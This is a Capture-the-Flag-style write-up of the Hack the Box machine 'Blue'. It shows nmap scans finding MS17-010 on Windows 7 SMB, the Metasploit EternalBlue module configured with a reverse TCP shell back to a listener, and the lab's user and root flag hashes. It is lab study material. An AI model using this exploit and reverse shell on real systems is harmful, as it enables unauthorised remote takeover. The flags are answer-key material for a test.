# Blue - Hack the Box - Report

First things First

## Nmap Scan

1. `nmap -p 1-65535 -T4 -A -v blue`
2. `nmap --script vuln nmap/vulnscan blue`

### Results

### Port Scan

    PORT      STATE SERVICE      VERSION
    135/tcp   open  msrpc        Microsoft Windows RPC
    139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
    49152/tcp open  msrpc        Microsoft Windows RPC
    49153/tcp open  msrpc        Microsoft Windows RPC
    49154/tcp open  msrpc        Microsoft Windows RPC
    49155/tcp open  msrpc        Microsoft Windows RPC
    49156/tcp open  msrpc        Microsoft Windows RPC
    49157/tcp open  msrpc        Microsoft Windows RPC

### Vuln Scan

    Host script results:
    |_smb-vuln-ms10-054: false
    |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
    | smb-vuln-ms17-010:
    |   VULNERABLE:
    |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2017-0143
    |     Risk factor: HIGH
    |       A critical remote code execution vulnerability exists in Microsoft SMBv1
    |        servers (ms17-010).
    |           
    |     Disclosure date: 2017-03-14
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
    |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
    |_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

## SMB Vulnerability

I searched the msfconsole for CVE-2017-0143. A couple of results popped up. I used the eternal blue.

`msf5 exploit(windows/smb/ms17_010_eternalblue`

    Module options (exploit/windows/smb/ms17_010_eternalblue):

       Name           Current Setting  Required  Description
       ----           ---------------  --------  -----------
       RHOSTS         10.10.10.40      yes       The target address range or CIDR identifier
       RPORT          445              yes       The target port (TCP)
       SMBDomain      .                no        (Optional) The Windows domain to use for authentication
       SMBPass                         no        (Optional) The password for the specified username
       SMBUser                         no        (Optional) The username to authenticate as
       VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
       VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


    Payload options (generic/shell_reverse_tcp):

       Name   Current Setting  Required  Description
       ----   ---------------  --------  -----------
       LHOST  10.10.14.17      yes       The listen address (an interface may be specified)
       LPORT  4444             yes       The listen port


    Exploit target:

       Id  Name
       --  ----
       0   Windows 7 and Server 2008 R2 (x64) All Service Packs

I enumerated the machine and found a *user.txt* file:

`4c546aea7dbee75cbd71de245c8deea9`

Then I found the root.txt:

`ff548eb71e920ff6c08843ce9df4e717`
